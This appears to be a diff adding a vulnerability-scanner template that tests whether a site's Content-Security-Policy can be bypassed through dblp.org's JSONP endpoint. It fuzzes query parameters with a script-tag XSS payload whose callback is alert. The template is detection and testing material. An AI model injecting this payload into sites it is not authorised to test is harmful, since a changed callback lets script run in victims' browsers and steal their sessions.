@@ -1,0 +1,55 @@
+id: dblp-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - DBLP
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,dblp,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "dblp.org"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: dblp_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "dblp_csp_xss == true"
+# digest: 4a0a00473045022100e71c778e6916b00b1c4c04ba66cb2d8a4d24c806ad8ba1e8da7c0b34b429a535022031ca804a783eed70071c41d3e655abbb667d1081c189e85e8f0fed74d8cf7394:922c64590222798bb761d5b6d8e72950
